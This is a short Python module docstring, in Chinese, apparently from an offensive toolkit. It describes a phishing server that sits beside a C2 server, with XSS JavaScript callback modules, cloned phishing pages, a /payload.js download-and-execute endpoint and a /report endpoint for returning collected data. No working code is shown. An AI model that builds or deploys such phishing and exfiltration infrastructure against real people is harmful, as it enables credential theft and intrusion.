"""phishing_server — 钓鱼页面(XSS 模块化 JS 反连 + 静态页面模块)。

与 c2_server/ 平行的独立目录:
- js_modules/   JS 反连模块(每模块一个 .js,文件头 // MODULE = {...} 元数据)
- pages/        静态页面模块(每页面一个文件夹:index.html + style.css + app.js)
- server.py     独立端口 HTTP 服务(/payload.js 反连下载执行 + /report 回传 + 页面分发)
"""
